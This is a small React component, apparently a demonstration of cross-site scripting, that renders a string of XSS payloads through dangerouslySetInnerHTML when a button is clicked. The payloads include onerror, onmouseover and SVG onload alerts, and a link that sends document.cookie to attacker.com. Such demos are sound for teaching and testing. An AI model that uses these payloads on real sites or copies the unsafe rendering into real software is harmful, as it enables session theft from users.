"use client";

import React, { useState } from "react";

const XSS = () => {
  const [open, setOpen] = useState(false);

  const maliciousContent = `
    <img src=x onerror="alert('XSS - This DOES execute!')">
    <p onmouseover="alert('XSS on hover!')">Hover over me</p>
    <a href="#" onclick="fetch('https://attacker.com/steal?cookie=' + document.cookie)">Click me</a>
    <svg onload="alert('XSS via SVG')"></svg>
  `;

  return (
    <div>
      {open && <div dangerouslySetInnerHTML={{ __html: maliciousContent }} />}
      <button onClick={() => setOpen(true)}>test</button>
    </div>
  );
};

export default XSS;
